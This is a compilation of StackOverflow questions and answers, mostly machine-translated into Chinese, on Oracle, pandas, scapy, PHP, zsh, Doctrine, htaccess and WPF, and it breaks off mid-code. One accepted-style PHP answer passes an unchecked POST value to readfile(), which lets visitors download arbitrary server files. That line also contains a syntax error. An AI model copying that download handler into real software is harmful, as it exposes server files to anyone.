# StackOverflow 问答 15555000-15555999

# oracle - 根据值对列重新排序

> ID：15555002
> 
> 赞同：1
> 
> 时间：2013-03-21T18:10:33.137
> 
> 标签：oracle

有没有办法根据值对表（或查询）中的列进行重新排序。

例如，在每一行上，FacName 应该是第一个，NPI - 2nd，TIN - 3rd 和 Address - 4th。

谢谢你！

![在此处输入图像描述](../Images/35083383c1b7b5c5548e061f68d9014f.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:53:38.397

```
select col1, col2, col3, col4 from (
  select * from (
    select 
      n, str, row_number() over (partition by n order by 
      decode(substr(str,1,3),'Fac',1,'NPI',2,'TIN',3,'Add',4)) cn 
    from (
      select * from (select t.*, rownum n from t)
      unpivot (str for cn in (col1 as 0, col2 as 0, col3 as 0, col4 as 0))
    )
  )
  pivot (min(str) for cn in (1 as col1, 2 as col2, 3 as col3, 4 as col4))
)
order by n 
```

[小提琴](http://www.sqlfiddle.com/#!4/1b742/1)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T18:46:10.197

您想要在列之间移动数据这一事实强烈暗示底层数据模型已损坏并且需要进行规范化。修复数据模型比给系统增加另一层复杂性要合适得多。

话虽这么说，你应该能够做类似的事情

```
SELECT (CASE WHEN column1 LIKE 'FacilityName%' THEN column1
             WHEN column2 LIKE 'FacilityName%' THEN column2
             WHEN column3 LIKE 'FacilityName%' THEN column3
             WHEN column4 LIKE 'FacilityName%' THEN column4
             ELSE null
         END) column1,
       (CASE WHEN column1 LIKE 'NPI%' THEN column1
             WHEN column2 LIKE 'NPI%' THEN column2
             WHEN column3 LIKE 'NPI%' THEN column3
             WHEN column4 LIKE 'NPI%' THEN column4
             ELSE null
         END) column2,
       (CASE WHEN column1 LIKE 'TIN%' THEN column1
             WHEN column2 LIKE 'TIN%' THEN column2
             WHEN column3 LIKE 'TIN%' THEN column3
             WHEN column4 LIKE 'TIN%' THEN column4
             ELSE null
         END) column3,
       (CASE WHEN column1 LIKE 'Address%' THEN column1
             WHEN column2 LIKE 'Address%' THEN column2
             WHEN column3 LIKE 'Address%' THEN column3
             WHEN column4 LIKE 'Address%' THEN column4
             ELSE null
         END) column4
  FROM( <<your query>> ) 
```

# python - 使用 chunksize 迭代地获取推断的数据帧类型

> ID：15555005
> 
> 赞同：8
> 
> 时间：2013-03-21T18:10:45.930
> 
> 标签：python, type-conversion, pandas, hdfstore

> 如何使用 pd.read_csv() 迭代地对文件进行分块并保留 dtype 和其他元信息，就像我一次读取整个数据集一样？

我需要读取一个太大而无法放入内存的数据集。我想使用 pd.read_csv 导入文件，然后立即将块附加到 HDFStore。但是，数据类型推断对后续块一无所知。

如果存储在表中的第一个块仅包含 int 并且后续块包含浮点数，则会引发异常。所以我需要首先使用 read_csv 遍历数据帧并保留*最高*推断类型。此外，对于对象类型，我需要保留最大长度，因为它们将作为字符串存储在表中。

有没有一种方法可以只保留这些信息而不读取整个数据集？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-21T19:41:15.230

我不认为它会这么直观，否则我不会发布这个问题。但是再一次，熊猫让事情变得轻而易举。但是，保留问题，因为此信息可能对处理大数据的其他人有用：

```
In [1]: chunker = pd.read_csv('DATASET.csv', chunksize=500, header=0)

# Store the dtypes of each chunk into a list and convert it to a dataframe:

In [2]: dtypes = pd.DataFrame([chunk.dtypes for chunk in chunker])

In [3]: dtypes.values[:5]
Out[3]:
array([[int64, int64, int64, object, int64, int64, int64, int64],
       [int64, int64, int64, int64, int64, int64, int64, int64],
       [int64, int64, int64, int64, int64, int64, int64, int64],
       [int64, int64, int64, int64, int64, int64, int64, int64],
       [int64, int64, int64, int64, int64, int64, int64, int64]], dtype=object)

# Very cool that I can take the max of these data types and it will preserve the hierarchy:

In [4]: dtypes.max().values
Out[4]: array([int64, int64, int64, object, int64, int64, int64, int64], dtype=object)

# I can now store the above into a dictionary:

types = dtypes.max().to_dict()

# And pass it into pd.read_csv fo the second run:

chunker = pd.read_csv('tree_prop_dset.csv', dtype=types, chunksize=500) 
```

# python - 'haslayer' 函数在 scapy-python 中不起作用

> ID：15555007
> 
> 赞同：3
> 
> 时间：2013-03-21T18:10:53.577
> 
> 标签：python, scapy

我正在尝试编写一个简单的代码来检测 ICMP 数据包的 IP 源地址`scapy`，问题是`haslayer`函数看起来没有返回任何内容。

```
from scapy.all import *

while 1:

    pkt = sniff ( iface="eth0" , count = 1 )
    pkt.summary()

    try:
        if pkt.haslayer(IP):
            ipsrc =pkt.getlayer(IP).src
            print ipsrc

    except:
        pass 
```

结果是

```
Ether / IP / ICMP 10.0.2.15 > 10.0.2.11 echo-request 0 / Raw
Ether / IP / ICMP 10.0.2.15 > 10.0.2.11 echo-request 0 / Raw
Ether / IP / ICMP 10.0.2.15 > 10.0.2.11 echo-request 0 / Raw 
```

所以我无法捕获 ICMP 请求的 IP 源地址有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T17:15:28.200

您的泛型`except`掩盖了您的代码可能遇到的任何错误。更改`pass`并`raise`删除任何特定错误。例如，我遇到的第一个代码是：

```
socket.error: [Errno 1] Operation not permitted 
```

`root`在我得到之后运行：

```
AttributeError: 'list' object has no attribute 'haslayer' 
```

这使我将代码更改为有效的代码（运行为`root`）：

```
from scapy.all import *

while 1:

    pktl = sniff ( iface="eth0" , count = 1 )
    pktl.summary()

    for pkt in pktl:
        try:
            if pkt.haslayer(IP):
                ipsrc =pkt.getlayer(IP).src
                print ipsrc
        except:
            raise 
```

因此，您最好删除尝试-完全除外

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-04-06T23:56:06.893

@Hussam - 你不需要循环，但如果你使用语法 pkt = sniff() 那么它会返回一个数组。另一种写法是：

```
#!/usr/bin/env python

from scapy.all import *

pkt = sniff(count=1, filter="ip")

if pkt[0].haslayer(IP):
    print pkt[0][IP].src 
```

您也可以使用传递给 sniff() 的函数来执行此操作，其中每个数据包都作为数据包而不是数组传递给函数。一个例子是：

```
#!/usr/bin/env python

from scapy.all import *

def print_ip_src(pkt):
    if pkt.haslayer(IP):
        print pkt[IP].src

sniff(prn=print_ip_src, filter="ip") 
```

请注意，没有循环或从函数分配变量。这将无限期运行，每个数据包都将发送到我包含的 print_ip_src() 函数。

PS：我使用 BPF 过滤器仅捕获 IP 数据包，但是无论如何，作为安全措施，您仍然应该包含 haslayer() 函数。

# php - 从 jQuery Noty 按钮初始化 php 下载

> ID：15555012
> 
> 赞同：0
> 
> 时间：2013-03-21T18:11:12.430
> 
> 标签：php, jquery, download

当单击 jquery noty 中的按钮时，我正在尝试使用 PHP 启动下载。当通知应该出现并且萤火虫控制台中没有错误时，我得到了空白页。

```
var noty_id = noty({
text: 'blah',
type: 'success',
buttons: [
    {addClass: 'btn btn-primary', text: 'Download', onClick: function($noty) {

        $noty.close();
        <?php

        if (file_exists($file)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename='.basename($file));
            header('Content-Transfer-Encoding: binary');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            ob_clean();
            flush();
            readfile($file);
            exit;
        }
        ?>  
    }}
]
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T21:12:35.533

让它在没有ajax的情况下工作。我从 jquery.noty.js 更改了第 64 行

从：

```
var $buttons = $('<div/>').addClass('noty_buttons'); 
```

到：

```
var $buttons = $("<form method='post'><input type='hidden' name='download' id='download'</form>").addClass('noty_buttons'); 
```

然后我在 noty 调用期间为隐藏字段赋值：

```
var noty_id = noty({
    text: 'blah',
    type: 'success',
    buttons: [
        {addClass: 'btn btn-primary', text: 'Download', onClick: function($noty) {

            document.getElementById('download').value = file;
            $noty.close();  
        }}
   ]
 }); 
```

之后剩下的就是在表单发布后开始下载

```
<?php    
if(isset($_POST['download']))
{    
    $file = $_POST['download']);

    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename='.basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    }   
}
?> 
```

# zsh - 如何将此命令转换为 zsh 函数

> ID：15555018
> 
> 赞同：0
> 
> 时间：2013-03-20T23:28:38.503
> 
> 标签：zsh

这是我想翻译成 zsh 函数的命令，它对字符串进行全局搜索和替换：

```
find ./ -type f -exec sed -i 's/string1/string2/' {} \; 
```

我试过：

```
gr () {
    find ./ -type f -exec sed -i 's/$1/$2/' {} \;
} 
```

但这似乎不起作用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-21T09:15:26.803

明显的错误是错误的引用——一如既往。`'`防止外壳扩展变量，这是您想要的。改为使用`"`-- 并且您可能还需要 sed 的*全局*标志：

```
gr () {
    find ./ -type f -exec sed -i "s/$1/$2/g" {} \;
} 
```

但是，这不是很`zsh`时尚......以下内容更短，恕我直言，更好阅读：

```
gr () {
    sed -i "s/$1/$2/g" **/*(.)
} 
```

*   `**`递归搜索，但不遵循符号链接（`***`如果需要，请使用）
*   `(.)`将结果限制为纯文件

# php - 将 PHP 的explode 函数与会话变量一起使用

> ID：15555023
> 
> 赞同：0
> 
> 时间：2013-03-21T18:12:14.807
> 
> 标签：php, session-variables, explode

当我将explode函数与会话变量结合起来时，我试图弄清楚我做错了什么。我已经对会话变量和explode 函数进行了大量研究，但是在“结合”这两者时我很难找到帮助。

下面是我正在使用的代码。你会注意到它`$_SESSION['shirt_type']`正在“爆炸”。这个变量收集两条信息，衬衫类型和价格。我想炸成`$_SESSION['shirt_type']`两块。

但是，当我尝试使用以下内容回显块 [0] 或 [1] 时，

```
echo "Shirt Type = {$_SESSION['$shirt_type_chunks[0]']}<br>";
echo "Shirt Price = {$_SESSION['$shirt_type_chunks[1]']}<br>"; 
```

我的网页回显以下内容

```
Shirt Type = 
Shirt Price = 
```

我相信我的语法错误，并且在尝试回显分解的会话变量时，我无法找到任何展示正确语法的地方。

任何可以提供的帮助将不胜感激。另外，我对 StackOverflow 非常陌生，所以如果我发布了错误的内容，我深表歉意。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Untitled Document</title>
<?php
session_start();
$_SESSION['shirt_type'] = $_POST['shirt_type'];
$_SESSION['shirt_type_chunks'] = explode("|", $shirt_type);

$_SESSION['shirt_size'] = $_POST['shirt_size'];
$_SESSION['shirt_size_chunks'] = explode("|", $shirt_size);

$_SESSION['shirt_qty'] = $_POST['shirt_qty'];

$_SESSION['price'] = $_SESSION['$shirt_type_chunks[1]'] + $_SESSION['$shirt_size_chunks[1]'];
?>
</head>
<body>
<p>
  <?php
    session_start();

    echo "Shirt Type = {$_SESSION['$shirt_type_chunks[0]']}<br>";
    echo "Shirt Price = {$_SESSION['$shirt_type_chunks[1]']}<br>";
    echo "Shirt Up Charge = {$_SESSION['$shirt_size_chunks[1]']}<br>";
    echo "Shirt Size = {$_SESSION['$shirt_type_chunks[0]']}<br>";
    echo "Shirt Qty = {$_SESSION['shirt_qty']}<br>";

    echo "Price = {$_SESSION['price']}<br>";
  ?>
</p>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:13:23.293

You should start session *before any* output. Change your code to:

```
<? session_start(); ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
...
<title>Untitled Document</title>
<?
$_SESSION['shirt_type'] = $_POST['shirt_type'];
$_SESSION['shirt_type_chunks'] = explode("|", $shirt_type);
$_SESSION['shirt_size'] = $_POST['shirt_size'];
$_SESSION['shirt_size_chunks'] = explode("|", $shirt_size);

$_SESSION['shirt_qty'] = $_POST['shirt_qty'];

$_SESSION['price'] = $_SESSION['$shirt_type_chunks[1]'] + $_SESSION['$shirt_size_chunks[1]'];
?>
</head> 
```

Second thing you have wrong here is that $_SESSION['shirt_type'] and $shirt_type can be the same variable if `register_global = on` on your system. Try to avoid using same names for variables as for global variables, such as $_POST['some_name'] and $some_name or $_SESSION['var_name'] and $var_name

And the third issue, noticed by @brenjt, you need only one call for `session_start()` in your script.

Fourth =) `$_SESSION['$shirt_type_chunks[1]']` won't work. Using single quotes in PHP means that interpreter will not even try to find any variable in your string. Small example:

```
<?
$a = "Mike";
echo "Hi, my name is $a"; // will output Hi, my name is Mike
echo 'Hi, my name is $a'; // will output Hi, my name is $a
echo 'Hi, my name is '.$a; // will output Hi, my name is Mike
?> 
```

Third way is a most efficient because in this case PHP sees single quotes and do not spend resources to analyse string. So change it to `$_SESSION[$shirt_type_chunks[1]]`

Here is what, as I suppose, you was heading to:

```
<?php session_start(); ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Untitled Document</title>
<?php
$shirtDetails = explode("|", $_POST['shirt_type']);
$_SESSION['shirt_type'] = $shirtDetails['0'];
$_SESSION['shirt_price'] = $shirtDetails['1'];

$sizeDetails = explode("|", $_POST['shirt_size']);
$_SESSION['shirt_size'] = $sizeDetails[0];
$_SESSION['shirt_up_charge'] = $sizeDetails[1];
$_SESSION['shirt_qty'] = $_POST['shirt_qty'];

$_SESSION['price'] = $_SESSION['shirt_qty'] * $_SESSION['shirt_price'] + $_SESSION['shirt_up_charge'];
?>
</head>
<body>
<p>
  <?php
    echo 'Shirt Type = '.$_SESSION['shirt_type'].'<br>';
    echo 'Shirt Price = '.$_SESSION['shirt_price'].'<br>';
    echo 'Shirt Up Charge = '.$_SESSION['shirt_up_charge'].'<br>';
    echo 'Shirt Size = '.$_SESSION['shirt_size'].'<br>';
    echo 'Shirt Qty = '.$_SESSION['shirt_qty'].'<br>';
    echo 'Total Price = '.$_SESSION['price'].'<br>';
  ?>
</p>
</body>
</html> 
```

One final question - why you not just create single input for each form property? Why you want this data to be concatenated by |, is it really necessary?

# sql - 关系数据库系统使用哪些数据结构来存储数据？

> ID：15555030
> 
> 赞同：-2
> 
> 时间：2013-03-21T18:12:32.550
> 
> 标签：sql, database, database-design, data-structures

您是否还会描述在数据库系统上下文中使用特定结构的好处？我在一次采访中被问到这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:26:29.947

B树。分层索引、排序键和支持快速检索的平衡树是主要优点，并且可以很好地处理大量数据和插入/更新/删除。

# r - “函数”类出错

> ID：15555032
> 
> 赞同：-1
> 
> 时间：2013-03-21T18:12:38.933
> 
> 标签：r

我正在尝试运行以下脚本：

```
m <- matrix(c(1,1,2,1,3,12,14,16,30,21), nrow=5, ncol=2, byrow=FALSE);

colnames(m) <-c("Group","Score");
m<-data.frame(m)
head(m)

sum1 <- aggregate(list(total_score=m$Score), by=list(group=m$Group), FUN=sum)
sum1 
```

但是，当我运行脚本时，控制台返回以下错误：

```
Error in as.data.frame.default(x) : 
  cannot coerce class '"function"' into a data.frame 
```

我以前从未见过此错误....任何人对出了什么问题有任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T19:01:29.153

您很可能覆盖了其中一个内置函数，例如 list() 或 sum()。

需要注意的一点是，R 在启动时会自动加载一个名为“.RData”的工作区，并且您可能已将先前覆盖的函数保存在该文件中。

检查您启动 R 的文件夹中是否有任何 .RData 文件，然后删除它们或重命名它们（它们可能被隐藏了！），因此 R 在启动时不会加载任何内容。

# python - Python正则表达式在字符串开头不匹配？

> ID：15555035
> 
> 赞同：0
> 
> 时间：2013-03-21T18:12:48.537
> 
> 标签：python, regex, python-2.7

我正在浏览一个带有正则表达式提取数据的二进制文件，但我遇到了无法追踪的正则表达式问题。

这是我遇到问题的代码：

```
 z = 0
        for char in string:
            self.response.out.write('|%s' % char.encode('hex'))
            z+=1
            if z > 20:
                self.response.out.write('<br>')
                break

        title = []
        string = re.sub('^\x72.([^\x7A]+)', lambda match: append_match(match, title), string, 1)
        print_info('Title', title)

def append_match(match, collection, replace = ''):
    collection.append(match.group(1))
    return replace 
```

这是运行时字符串中前 20 个字符的内容：

|72|0a|50|79|72|65|20|54|72|6f|6c|6c|7a|19|54|72|6f|6c|6c|62|6c

它什么都不返回，除非我删除了 ^，在这种情况下它返回“Troll”（不是引号），即 54726F6C6C。当我阅读它时，它应该将所有内容返回到 \x7a 。

这里发生了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:32:12.800

问题是`\x0A`(=newline) 默认情况下不会被点匹配。尝试将[dotall 标志](http://docs.python.org/2/library/re.html#re.DOTALL)添加到您的模式中，例如：

```
re.sub('(?s)^\x72.([^\x7A]+).... 
```

# windows - 将 html 目录与 wi ndows 批处理连接起来，路径会回显到文件中。如何停止包含文件名？

> ID：15555039
> 
> 赞同：0
> 
> 时间：2013-03-21T18:12:57.317
> 
> 标签：windows, shell, batch-file, concatenation

我在 Windows XP/7 上使用拖放批处理脚本来连接 html 文件的目录。我发现命令的一部分被回显到文件内容上方的最终连接文件中。如何阻止 shell 提示符、类型和路径包含在我的文件中？

蝙蝠脚本：

```
set inputdir=%~dpn1
set scriptroot=%~dp0
>"%scriptroot%concat.html" (for /r %inputdir% %%F in (*.html) do type "%%F") 
```

输出：

```
C:\Documents and Settings\TMPUSER>type C:\test\test.html"
<html>
...
</html>
C:\Documents and Settings\TMPUSER>type C:\test\test2.html"
<html>
...
</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T18:28:46.460

如果您的程序是 .bat 文件，请在第一行写下：

```
@echo off 
```

默认情况下，显示命令（和工作文件夹）：

```
C:\folder>echo hi
hi 
```

要禁用此功能，请使用**@echo off**，要重新启用它，请使用**@echo on**。

希望它有所帮助！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T18:14:42.547

```
@echo off 
```

把它放在脚本的顶部。

# php - Doctrine 2 使用查询生成器删除

> ID：15555042
> 
> 赞同：32
> 
> 时间：2013-03-21T18:13:07.927
> 
> 标签：php, doctrine-orm

我有两个与 OneToMany`Project`和`Services`. 现在我想通过 project_id 删除所有服务。

第一次尝试：

```
$qb = $em->createQueryBuilder();
$qb->delete('Services','s');
$qb->andWhere($qb->expr()->eq('s.project_id', ':id'));
$qb->setParameter(':id',$project->getId()); 
```

此尝试失败并出现 Exception `Entity Service does not have property project_id`。确实，该属性不存在，它只是在数据库表中作为外键。

第二次尝试：

```
$qb = $em->createQueryBuilder();
$qb->delete('Services','s')->innerJoin('s.project','p');
$qb->andWhere($qb->expr()->eq('p.id', ':id'));
$qb->setParameter(':id',$project->getId()); 
```

这也产生了一个无效的 DQL 查询。

欢迎任何想法和例子。

* * *

## 回答 #1

> 赞同：71
> 
> 时间：2013-03-21T18:36:57.587

您正在使用 DQL，而不是 SQL，因此不要在您的条件中引用 ID，而是引用对象。

因此，您的第一个示例将更改为：

```
$qb = $em->createQueryBuilder();
$qb->delete('Services', 's');
$qb->where('s.project = :project');
$qb->setParameter('project', $project); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-06-19T09:55:53.197

如果您真的无法获得项目对象并且您只能使用 id 处理，您可以使用它。

来自学说文档的引用：使用 Doctrine 进行批量删除有两种可能性。您可以发出单个 DQL DELETE 查询，也可以遍历结果，一次删除一个。（下面我只粘贴第一个解决方案）

DQL 查询 迄今为止，批量删除最有效的方法是使用 DQL DELETE 查询。

在我的项目中工作的示例

```
$q = $em->createQuery('delete from AcmeMyTestBundle:TemplateBlock tb where tb.template = '.intval($templateId));
$numDeleted = $q->execute(); 
```

在实体 TemplateBlock 中，我有一个名为 template 的属性，该属性映射到 db 中的 template_id。

但我同意高度首选的方法是使用对象。

# php - How to get rootpath when the defines are set in a subdirectory?

> ID：15555052
> 
> 赞同：0
> 
> 时间：2013-03-21T18:13:25.617
> 
> 标签：php, directory, filepath

A reliable way to get the actual (full) rootpath when the define is in a subdirectory? Consider:

E:\web\sites\name\index.php
E:\web\sites\name\res\defines.php
E:\web\sites\name\res\another.php
E:\web\sites\name\classes\class-example.php

Where `E:\web\` is localhost and `E:\web\sites\name` is the intended root of the site.

An example path to define = `E:\web\sites\name\data\feature\file.txt`, in the manner of `$file = ROOTPATH."\data\feature\file.txt";`

The reason I don't use relative paths is because I want to pass the path in `classes\class-example.php` and also in `res\another.php` without using two constants for the same target.

So, in res\defines.php, what is the way to get the rootpath to point to `E:\web\sites\name\`? When the website is on a server, the same ROOTPATH should point to `http://www.example.com/`

Here's what I get when defines.php is in `res\defines.php`:

```
// Outputs: E:\web\sites\name\res
echo __DIR__;

// Outputs: E:\web\sites\name\res
echo realpath(__DIR__);

// Outputs: sites\name\res\another.php
echo $_SERVER['REQUEST_URI']

// Outputs: E:\web
echo $_SERVER['DOCUMENT_ROOT'];

// Outputs: sites\name\res\another.php
echo $_SERVER['SCRIPT_NAME'];

// Outputs: E:\web\sites\name\res\defines.php
echo __FILE__;

// Outputs: sites\name\res\another.php
echo $_SERVER['PHP_SELF']; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:13:25.617

The trick is to use: `dirname(__DIR__)` (PHP >= 5.3.0).

```
// Outputs: E:\web\sites\name
echo dirname(__DIR__); 
```

Note that there are questions that are slightly like this, but none of those that I checked had the information about `dirname(__DIR__)`; they all only mentioned `dirname(__FILE__)` which does **not** output the same thing as `dirname(__DIR__)` - the `__FILE__` version outputs `E:\web\sites\name\res`

Hopefully this info helps others with a similar problem regarding subdirectories :)

It would be interesting to hear if someone has a solution for older PHP versions too, in case someone is using one...

# wordpress - Zend Framework with Wordpress in subdirectory

> ID：15555056
> 
> 赞同：0
> 
> 时间：2013-03-21T18:13:40.687
> 
> 标签：wordpress, apache, .htaccess, mod-rewrite, zend-framework2

I want to serve wordpress from public_html/blog. I have already install zend framework and i would like to know how to achieve this. My .htaccess file looks like

```
RewriteEngine On

RewriteRule ^\.htaccess$ - [F]

RewriteCond %{HTTP_HOST} ^domain\.example\.com$ [OR]
RewriteCond %{HTTP_HOST} ^www\.domain\.example\.com$
RewriteRule ^/?$ "http\:\/\/simple\.com\/" [R=302,L]

RewriteCond %{HTTP_HOST} ^other\-domain\.example\.com$ [OR]
RewriteCond %{HTTP_HOST} ^www\.other\-domain\.example\.com$
RewriteRule ^/?$ "http\:\/\/simple\.com\/" [R=302,L]

RewriteCond %{REQUEST_URI} =""
RewriteRule ^.*$ public/index.php [NC,L]

RewriteCond %{REQUEST_URI} !^/public/.*$
RewriteRule ^(.*)$ /public/$1

RewriteCond %{REQUEST_FILENAME} -f
RewriteRule ^.*$ - [NC,L]

RewriteRule ^public/.*$ public/index.php [NC,L] 
```

I am totaly green in htaccess files and this is my first case with it. Is that structure already correct?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T15:57:35.463

在您的 ZF htaccess 中，允许 apache 为现有文件和目录提供服务：

```
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} -s [OR]
RewriteCond %{REQUEST_FILENAME} -l [OR]
RewriteCond %{REQUEST_FILENAME} -d
RewriteRule ^.*$ - [NC,L]
RewriteRule ^.*$ index.php [NC,L] 
```

现在 apache 会看到 /blog 是一个真正的文件夹，然后当用户转到 /blog 时，会在其中加载 htaccess（您的 WP htaccess）。

您应该能够将两个 htaccess 规则分开，而无需复杂的路由

# wpf - Keeping a WPF UI responsive while showing a slow loading UserControl

> ID：15555058
> 
> 赞同：7
> 
> 时间：2013-03-21T18:13:43.443
> 
> 标签：wpf, mvvm

We have a WPF application written using the MVVM pattern. Within the application is a TabControl with different UserControls within each tab. Under certain conditions one of the UserControls on a tab can take a significant portion of time to load when switching to the containing tab.

This is NOT because of any performance bottlenecks in the ViewModel. But instead, is due to significant amount of time that the usercontrol takes to bind to the ViewModel, and to create the various UI elements contained within it and initialize them.

When the user clicks on the tab for this usercontrol, the UI becomes completely unresponsive until the control has completed loading. If fact you don't even see the "active tab" switch until everything is loaded.

What strategies could I use to display a "spinner" with some sort of "please wait, loading..." message while waiting for the UI elements to complete loading?

UPDATE with sample code:

The below demonstrates the type of problem I am trying to get around. When you click on the "slow tab". The UI becomes unresponsive until all the items in the slow tab have rendered.

In the below, TestVM is the viewmodel for the slow tab. It has a large collection of children objects. Each created with it's own data template.

How could I display a "loading" message while the slow tab finishes loading?

```
public class MainVM
{
    private TestVM _testVM = new TestVM();
    public TestVM TestVM
    {
        get { return _testVM; }
    }
}

/// <summary>
/// TestVM is the ViewModel for the 'slow tab'. It contains a large collection of children objects that each will use a datatemplate to render. 
/// </summary>
public class TestVM
{
    private IEnumerable<ChildBase> _children;

    public TestVM()
    {
        List<ChildBase> list = new List<ChildBase>();
        for (int i = 0; i < 100; i++)
        {
            if (i % 3 == 0)
            {
                list.Add(new Child1());
            }
            else if (i % 3 == 1)
            {
                list.Add(new Child2());
            }
            else
            {
                list.Add(new Child3());
            }
        }
        _children = list;
    }

    public IEnumerable<ChildBase> Children
    {
        get {  return _children; }
    }
}

/// <summary>
/// Just a base class for a randomly positioned VM
/// </summary>
public abstract class ChildBase
{
    private static Random _rand = new Random(1);

    private int _top = _rand.Next(800);
    private int _left = _rand.Next(800);

    public int Top { get { return _top; } }
    public int Left { get { return _left; } }
}

public class Child1 : ChildBase { }

public class Child2 : ChildBase  { }

public class Child3 : ChildBase { }

<Window x:Class="WpfApplication3.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:local="clr-namespace:WpfApplication3"
        Title="MainWindow" Height="350" Width="525">
    <Window.Resources>

        <!-- Template for the slow loading tab -->
        <DataTemplate DataType="{x:Type local:TestVM}">
            <ItemsControl ItemsSource="{Binding Children}">
                <ItemsControl.ItemsPanel>
                    <ItemsPanelTemplate>
                        <Canvas IsItemsHost="True"></Canvas>
                    </ItemsPanelTemplate>
                </ItemsControl.ItemsPanel>
                <ItemsControl.ItemContainerStyle>
                    <Style TargetType="FrameworkElement">
                        <Setter Property="Canvas.Top" Value="{Binding Top}"></Setter>
                        <Setter Property="Canvas.Left" Value="{Binding Left}"></Setter>
                    </Style>
                </ItemsControl.ItemContainerStyle>
            </ItemsControl>
        </DataTemplate>

        <!-- examples of different child templates contained in the slow rendering tab -->
        <DataTemplate DataType="{x:Type local:Child1}">
            <DataGrid></DataGrid><!--simply an example of a complex control-->
        </DataTemplate>

        <DataTemplate DataType="{x:Type local:Child2}">
            <RichTextBox Width="30" Height="30">
                <!--simply an example of a complex control-->
            </RichTextBox>
        </DataTemplate>

        <DataTemplate DataType="{x:Type local:Child3}">
            <Calendar Height="10" Width="15"></Calendar>
        </DataTemplate>

    </Window.Resources>
    <Grid>
        <TabControl>
            <TabItem Header="Fast Loading tab">
                <TextBlock Text="Not Much Here"></TextBlock>
            </TabItem>
            <TabItem Header="Slow Tab">
                <ContentControl Content="{Binding TestVM}"></ContentControl>
            </TabItem>
        </TabControl>
    </Grid>
</Window> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:17:52.790

你需要什么在这里

[http://msdn.microsoft.com/en-us/library/ms741870.aspx](http://msdn.microsoft.com/en-us/library/ms741870.aspx)

```
 public partial class Window1 : Window
    {
        // Delegates to be used in placking jobs onto the Dispatcher. 
        private delegate void NoArgDelegate();
        private delegate void OneArgDelegate(String arg);

        // Storyboards for the animations. 
        private Storyboard showClockFaceStoryboard;
        private Storyboard hideClockFaceStoryboard;
        private Storyboard showWeatherImageStoryboard;
        private Storyboard hideWeatherImageStoryboard;

        public Window1(): base()
        {
            InitializeComponent();
        }  

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            // Load the storyboard resources.
            showClockFaceStoryboard = 
                (Storyboard)this.Resources["ShowClockFaceStoryboard"];
            hideClockFaceStoryboard = 
                (Storyboard)this.Resources["HideClockFaceStoryboard"];
            showWeatherImageStoryboard = 
                (Storyboard)this.Resources["ShowWeatherImageStoryboard"];
            hideWeatherImageStoryboard = 
                (Storyboard)this.Resources["HideWeatherImageStoryboard"];   
        }

        private void ForecastButtonHandler(object sender, RoutedEventArgs e)
        {
            // Change the status image and start the rotation animation.
            fetchButton.IsEnabled = false;
            fetchButton.Content = "Contacting Server";
            weatherText.Text = "";
            hideWeatherImageStoryboard.Begin(this);

            // Start fetching the weather forecast asynchronously.
            NoArgDelegate fetcher = new NoArgDelegate(
                this.FetchWeatherFromServer);

            fetcher.BeginInvoke(null, null);
        }

        private void FetchWeatherFromServer()
        {
            // Simulate the delay from network access.
            Thread.Sleep(4000);              

            // Tried and true method for weather forecasting - random numbers.
            Random rand = new Random();
            String weather;

            if (rand.Next(2) == 0)
            {
                weather = "rainy";
            }
            else
            {
                weather = "sunny";
            }

            // Schedule the update function in the UI thread.
            tomorrowsWeather.Dispatcher.BeginInvoke(
                System.Windows.Threading.DispatcherPriority.Normal,
                new OneArgDelegate(UpdateUserInterface), 
                weather);
        }

        private void UpdateUserInterface(String weather)
        {    
            //Set the weather image 
            if (weather == "sunny")
            {       
                weatherIndicatorImage.Source = (ImageSource)this.Resources[
                    "SunnyImageSource"];
            }
            else if (weather == "rainy")
            {
                weatherIndicatorImage.Source = (ImageSource)this.Resources[
                    "RainingImageSource"];
